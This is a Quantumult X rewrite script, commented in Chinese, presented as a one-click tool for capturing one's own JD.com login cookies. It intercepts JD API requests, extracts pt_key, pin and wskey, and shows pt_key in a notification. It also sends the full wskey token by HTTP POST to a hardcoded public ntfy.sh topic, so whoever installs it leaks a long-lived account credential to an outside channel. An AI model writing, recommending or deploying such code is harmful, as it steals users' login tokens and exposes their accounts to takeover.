/**
 * 京东 Cookie + Wskey 一键抓取 (Quantumult X)
 *
 * 直接粘贴到 圈X → 风车 → 重写 → 右上角+
 * 类型: script-request-header
 * URL:  ^https?://api\.m\.jd\.com/
 *
 * 功能:
 *   - pt_pin + pt_key → 弹窗显示，长按复制
 *   - wskey → 推送 ntfy.sh
 */

const cookie = $request.headers['Cookie'] || $request.headers['cookie'] || '';
const NTFY_URL = 'https://ntfy.sh/HzjHy2codes';

if (!cookie) {
  $done({});
}

// ==================== 抓 pt_key ====================
const pt_pin = (cookie.match(/pt_pin=([^;]+)/) || [])[1];
const pt_key = (cookie.match(/pt_key=([^;]+)/) || [])[1];

if (pt_pin && pt_key) {
  const dedupKey1 = 'jd_pt_' + pt_pin;
  const last1 = $persistentStore.read(dedupKey1) || '0';
  if (Date.now() - parseInt(last1) > 300000) {
    $persistentStore.write(String(Date.now()), dedupKey1);
    $notification.post('🔑 京东Cookie', pt_pin, pt_key + '\n\n长按复制上方pt_key');
    console.log('[JD-CK] pt_pin=' + pt_pin + ' pt_key=' + pt_key.substring(0, 30) + '...');
  }
}

// ==================== 抓 wskey ====================
const wskey = (cookie.match(/wskey=([^;]+)/) || [])[1];
const pin = (cookie.match(/pin=([^;]+)/) || [])[1];

if (wskey) {
  const dedupKey2 = 'jd_ws_' + (pin || 'unknown') + '_' + wskey.substring(0, 16);
  const last2 = $persistentStore.read(dedupKey2) || '0';
  if (Date.now() - parseInt(last2) > 300000) {
    $persistentStore.write(String(Date.now()), dedupKey2);
    $notification.post('🔐 京东WSKEY', pin || 'unknown', 'wskey=' + wskey.substring(0, 30) + '...');
    console.log('[JD-WS] pin=' + (pin || 'unknown') + ' wskey=' + wskey.substring(0, 30) + '...');

    // 推送 ntfy
    const payload = 'JDWSKEY pin=' + (pin || 'unknown') + ';wskey=' + wskey + ';';
    $httpClient.post({
      url: NTFY_URL,
      headers: { 'Content-Type': 'text/plain', Title: 'JD_wskey_' + (pin || 'unknown') },
      body: payload
    }, () => {});
  }
}

$done({});
